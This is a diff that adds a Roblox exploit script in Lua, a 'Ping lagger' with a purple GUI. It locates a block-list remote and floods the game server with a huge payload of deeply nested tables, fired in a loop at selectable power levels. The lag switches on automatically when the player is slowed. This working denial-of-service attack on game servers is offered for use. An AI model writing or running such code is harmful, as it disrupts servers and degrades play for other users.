@@ -1,0 +1,281 @@
+-- Purple Theme (Enlarged & Matched to Screenshot) - Remote & Payload taken from Askar Hub
+local Players, UserInputService, HttpService, RunService, TweenService = 
+	game:GetService("Players"), game:GetService("UserInputService"), game:GetService("HttpService"), game:GetService("RunService"), game:GetService("TweenService")
+
+local plr, playerGui = Players.LocalPlayer, Players.LocalPlayer:WaitForChild("PlayerGui")
+
+local THEME_WHITE, THEME_BLACK, THEME_DARK = Color3.fromRGB(242, 244, 255), Color3.fromRGB(10, 10, 14), Color3.fromRGB(15, 13, 32)
+local THEME_PURPLE = Color3.fromRGB(154, 68, 255)
+local PRESET_ON, PRESET_OFF = Color3.fromRGB(146, 62, 246), Color3.fromRGB(20, 18, 36)
+local BG_IMAGE = "rbxthumb://type=Asset&id=75200452514552&w=420&h=420"
+local CONFIG_FILE = "ANASPingLagger_Config.json"
+
+local DEFAULT_CFG = { power = 95000, interval = 0.125, keybind = "F", controllerBind = "None", autoBrainrot = true, background = BG_IMAGE }
+local cfg = table.clone(DEFAULT_CFG)
+
+local function saveConfig()
+	local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+	if ok and encoded and writefile then pcall(writefile, CONFIG_FILE, encoded) end
+end
+
+local function loadConfig()
+	if not (isfile and readfile and isfile(CONFIG_FILE)) then return end
+	local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
+	if ok and type(data) == "table" then
+		cfg.power = tonumber(data.power) or DEFAULT_CFG.power
+		cfg.interval = tonumber(data.interval) or DEFAULT_CFG.interval
+		cfg.keybind = type(data.keybind) == "string" and data.keybind or DEFAULT_CFG.keybind
+		cfg.controllerBind = type(data.controllerBind) == "string" and data.controllerBind or DEFAULT_CFG.controllerBind
+		cfg.autoBrainrot = type(data.autoBrainrot) == "boolean" and data.autoBrainrot or DEFAULT_CFG.autoBrainrot
+		cfg.background = BG_IMAGE
+	end
+end
+loadConfig()
+
+local active, remote = true, nil
+local brainrotMode, lastBrainrotState, manualOverride, uiLocked = false, false, false, false
+local refreshUI, loopTask
+
+-- Askar Hub Remote Finder (supports RemoteEvent, UnreliableRemoteEvent, RemoteFunction)
+local function findRemote()
+	local rrs = game:FindFirstChild("RobloxReplicatedStorage")
+	if not rrs then return nil end
+	local found = nil
+	for _, name in ipairs({"SetPlayerBlockList", "UpdatePlayerBlockList", "SetBlockList", "UpdateBlockList"}) do
+		local r = rrs:FindFirstChild(name)
+		if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent") or r:IsA("RemoteFunction")) then
+			found = r
+			break
+		end
+	end
+	if not found then
+		for _, c in ipairs(rrs:GetChildren()) do
+			if (c:IsA("RemoteEvent") or c:IsA("UnreliableRemoteEvent") or c:IsA("RemoteFunction")) and c.Name:find("Block") then
+				found = c
+				break
+			end
+		end
+	end
+	return found
+end
+
+remote = findRemote()
+
+-- Askar Hub Payload Builder
+local function buildPayload(power)
+	local safePower = tonumber(power) or DEFAULT_CFG.power
+	if safePower < 1 then safePower = 1 end
+	local main = {}
+	local nested = {{}}
+	local current = nested[1]
+	for _ = 1, 186 do
+		local n = {}
+		table.insert(current, n)
+		current = n
+	end
+	local maxRep = math.min(math.floor(safePower / 188), 10000)
+	if maxRep < 1 then maxRep = 1 end
+	for _ = 1, maxRep do
+		table.insert(main, nested)
+	end
+	return main
+end
+
+local function setLag(state)
+	active = state
+	if loopTask then pcall(task.cancel, loopTask) loopTask = nil end
+	if active then
+		if not remote or not remote.Parent then remote = findRemote() end
+		local payload = buildPayload(cfg.power)
+		loopTask = task.spawn(function()
+			local currentDelay = tonumber(cfg.interval) or DEFAULT_CFG.interval
+			while active do
+				if not remote or not remote.Parent then
+					remote = findRemote()
+					if not remote then task.wait(0.5) continue end
+				end
+				local ok = pcall(function()
+					if remote:IsA("RemoteFunction") then
+						remote:InvokeServer(payload)
+					else
+						remote:FireServer(payload)
+					end
+				end)
+				currentDelay = ok and math.max(currentDelay * 0.995, 0.05) or math.min(currentDelay * 1.5, 0.5)
+				task.wait(currentDelay)
+			end
+		end)
+	end
+end
+
+RunService.Heartbeat:Connect(function()
+	if not cfg.autoBrainrot then
+		if brainrotMode then brainrotMode, lastBrainrotState = false, false end
+		return
+	end
+	local char = plr.Character
+	local hum = char and char:FindFirstChildOfClass("Humanoid")
+	if not hum then return end
+
+	local hasBrainrot = hum.WalkSpeed < 25
+	if hasBrainrot and not lastBrainrotState then
+		brainrotMode, lastBrainrotState, manualOverride = true, true, false
+		if not active then setLag(true) if refreshUI then refreshUI() end end
+	elseif not hasBrainrot and lastBrainrotState then
+		brainrotMode, lastBrainrotState, manualOverride = false, false, false
+		if active then setLag(false) if refreshUI then refreshUI() end end
+	end
+end)
+
+-------------------------------------------------
+-- GUI SETUP (ENLARGED RECTANGULAR BOXES)
+-------------------------------------------------
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name, screenGui.ResetOnSpawn, screenGui.IgnoreGuiInset, screenGui.DisplayOrder, screenGui.ZIndexBehavior = "ANASPingLagger", false, true, 1000, Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+-- Main Frame
+local frame = Instance.new("Frame")
+frame.Name, frame.Size, frame.Position = "Main", UDim2.new(0, 260, 0, 140), UDim2.new(0.5, -130, 0.36, -70)
+frame.BackgroundColor3, frame.BorderSizePixel, frame.ClipsDescendants, frame.Parent = THEME_DARK, 0, true, screenGui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+
+local stroke = Instance.new("UIStroke")
+stroke.Color, stroke.Transparency, stroke.Thickness, stroke.Parent = Color3.fromRGB(168, 92, 255), 0.22, 1.3, frame
+
+local bgImage = Instance.new("ImageLabel")
+bgImage.Size, bgImage.BackgroundTransparency, bgImage.Image, bgImage.ZIndex, bgImage.Parent = UDim2.fromScale(1, 1), 1, cfg.background or BG_IMAGE, 1, frame
+Instance.new("UICorner", bgImage).CornerRadius = UDim.new(0, 12)
+
+local starContainer = Instance.new("Frame")
+starContainer.Size, starContainer.BackgroundTransparency, starContainer.ZIndex, starContainer.ClipsDescendants, starContainer.Parent = UDim2.fromScale(1, 1), 1, 2, true, frame
+
+local stars = {}
+for _ = 1, 16 do
+	local s = Instance.new("Frame")
+	s.Size, s.Position = UDim2.fromOffset(math.random(1, 2), math.random(1, 2)), UDim2.fromScale(math.random(), math.random())
+	s.BackgroundColor3, s.BorderSizePixel, s.BackgroundTransparency, s.ZIndex, s.Parent = THEME_WHITE, 0, math.random(45, 85) / 100, 2, starContainer
+	Instance.new("UICorner", s).CornerRadius = UDim.new(1, 0)
+	table.insert(stars, { frame = s, speedX = (math.random(-15, 15) / 100), speedY = (math.random(12, 35) / 100) })
+end
+
+RunService.RenderStepped:Connect(function(dt)
+	for _, star in ipairs(stars) do
+		local cur = star.frame.Position
+		star.frame.Position = UDim2.fromScale((cur.X.Scale + star.speedX * dt * 0.1) % 1, (cur.Y.Scale + star.speedY * dt * 0.1) % 1)
+	end
+end)
+
+local function createText(name, text, sz, pos, font, size, col, strokeTrans, parent)
+	local lbl = Instance.new("TextLabel")
+	lbl.Name, lbl.Size, lbl.Position, lbl.BackgroundTransparency = name, sz, pos, 1
+	lbl.Text, lbl.TextColor3, lbl.TextSize, lbl.Font = text, col, size, font
+	lbl.TextStrokeColor3, lbl.TextStrokeTransparency, lbl.TextXAlignment, lbl.ZIndex, lbl.Parent = THEME_BLACK, strokeTrans, Enum.TextXAlignment.Left, 6, parent
+	return lbl
+end
+
+createText("TitleMain", "ANAS", UDim2.new(0, 95, 0, 18), UDim2.new(0, 14, 0, 10), Enum.Font.GothamBlack, 14, THEME_WHITE, 0.25, frame)
+createText("TitleSub", "Ping lagger", UDim2.new(0, 95, 0, 15), UDim2.new(0, 14, 0, 25), Enum.Font.GothamMedium, 10, Color3.fromRGB(165, 130, 255), 0.35, frame)
+
+local function createBtn(name, text, sz, pos, bgCol, font, textSz, cornerRadius, parent)
+	local btn = Instance.new("TextButton")
+	btn.Name, btn.Size, btn.Position = name, sz, pos
+	btn.BackgroundColor3, btn.BorderSizePixel, btn.Text, btn.TextColor3 = bgCol, 0, text, THEME_WHITE
+	btn.Font, btn.TextSize, btn.ZIndex, btn.Parent = font, textSz, 7, parent
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, cornerRadius)
+	return btn
+end
+
+local topStatusBtn = createBtn("TopStatusBtn", "ACTIVE", UDim2.new(0, 66, 0, 22), UDim2.new(0.5, -33, 0, 11), THEME_PURPLE, Enum.Font.GothamBlack, 9, 11, frame)
+topStatusBtn.TextColor3 = THEME_BLACK
+topStatusBtn.BackgroundTransparency = 0.04
+
+-- Settings Button (No action on click)
+local settingsBtn = createBtn("SettingsBtn", "🎵", UDim2.new(0, 22, 0, 22), UDim2.new(1, -58, 0, 11), Color3.fromRGB(24, 26, 42), Enum.Font.GothamMedium, 10, 6, frame)
+settingsBtn.BackgroundTransparency = 0.18
+
+local lockBtn = createBtn("LockBtn", "🔒", UDim2.new(0, 22, 0, 22), UDim2.new(1, -32, 0, 11), THEME_PURPLE, Enum.Font.GothamBold, 10, 6, frame)
+lockBtn.TextColor3 = Color3.fromRGB(255, 198, 42)
+lockBtn.BackgroundTransparency = 0.04
+
+-------------------------------------------------
+-- MAIN RECTANGULAR ACTION BUTTON & PRESETS
+-------------------------------------------------
+local lagBtn = createBtn("MainActionBtn", "ACTIVE", UDim2.new(0, 232, 0, 42), UDim2.new(0.5, -116, 0, 50), THEME_PURPLE, Enum.Font.GothamBlack, 11, 8, frame)
+lagBtn.TextColor3 = THEME_BLACK
+lagBtn.BackgroundTransparency = 0.04
+lagBtn.ZIndex = 6
+
+local lagStroke = Instance.new("UIStroke")
+lagStroke.Color, lagStroke.Transparency, lagStroke.Thickness, lagStroke.ApplyStrokeMode, lagStroke.Parent = Color3.fromRGB(184, 122, 255), 0.35, 1, Enum.ApplyStrokeMode.Border, lagBtn
+
+-- Slimmer Rectangular Preset Buttons (Height 22, TextSize 8)
+local lowBtn = createBtn("LowBtn", "Low", UDim2.new(0, 72, 0, 22), UDim2.new(0.5, -116, 0, 102), PRESET_OFF, Enum.Font.GothamMedium, 8, 6, frame)
+local midBtn = createBtn("MidBtn", "Mid", UDim2.new(0, 72, 0, 22), UDim2.new(0.5, -36, 0, 102), PRESET_ON, Enum.Font.GothamMedium, 8, 6, frame)
+local highBtn = createBtn("HighBtn", "High", UDim2.new(0, 72, 0, 22), UDim2.new(0.5, 44, 0, 102), PRESET_OFF, Enum.Font.GothamMedium, 8, 6, frame)
+
+lowBtn.ZIndex, midBtn.ZIndex, highBtn.ZIndex = 6, 6, 6
+lowBtn.BackgroundTransparency, midBtn.BackgroundTransparency, highBtn.BackgroundTransparency = 0.32, 0.06, 0.32
+
+local function updatePresetButtonsVisual()
+	local lowSel, midSel, highSel = cfg.power == 85000, cfg.power == 95000, cfg.power == 100000
+	lowBtn.BackgroundColor3, lowBtn.BackgroundTransparency = lowSel and PRESET_ON or PRESET_OFF, lowSel and 0.06 or 0.32
+	midBtn.BackgroundColor3, midBtn.BackgroundTransparency = midSel and PRESET_ON or PRESET_OFF, midSel and 0.06 or 0.32
+	highBtn.BackgroundColor3, highBtn.BackgroundTransparency = highSel and PRESET_ON or PRESET_OFF, highSel and 0.06 or 0.32
+end
+
+local function setPower(p)
+	cfg.power = p
+	saveConfig()
+	updatePresetButtonsVisual()
+	if active then setLag(true) end
+	refreshUI()
+end
+
+lowBtn.MouseButton1Click:Connect(function() setPower(85000) end)
+midBtn.MouseButton1Click:Connect(function() setPower(95000) end)
+highBtn.MouseButton1Click:Connect(function() setPower(100000) end)
+
+-------------------------------------------------
+-- DRAGGABLE & LOGIC
+-------------------------------------------------
+local dragging, dragStart, startAbsPos
+frame.InputBegan:Connect(function(input)
+	if uiLocked then return end
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging, dragStart, startAbsPos = true, input.Position, frame.AbsolutePosition
+	end
+end)
+UserInputService.InputChanged:Connect(function(input)
+	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+		local delta = input.Position - dragStart
+		local vp = workspace.CurrentCamera.ViewportSize
+		local newX = math.clamp(startAbsPos.X + delta.X, 0, vp.X - frame.AbsoluteSize.X)
+		local newY = math.clamp(startAbsPos.Y + delta.Y, 0, vp.Y - frame.AbsoluteSize.Y)
+		frame.Position = UDim2.new(0, newX, 0, newY)
+	end
+end)
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
+end)
+
+refreshUI = function()
+	updatePresetButtonsVisual()
+	lockBtn.Text, lockBtn.TextColor3 = uiLocked and "🔒" or "🔓", uiLocked and Color3.fromRGB(255, 198, 42) or THEME_WHITE
+	lagBtn.Text, topStatusBtn.Text = active and "ACTIVE" or "OFF", active and "ACTIVE" or "OFF"
+end
+
+local function toggleLagState()
+	active = not active
+	manualOverride = not active
+	setLag(active)
+	refreshUI()
+end
+
+lagBtn.MouseButton1Click:Connect(toggleLagState)
+topStatusBtn.MouseButton1Click:Connect(toggleLagState)
+
+lockBtn.MouseButton1Click:Connect(function() uiLocked = not uiLocked refreshUI() end)
+
+refreshUI()
+if active then setLag(true) end
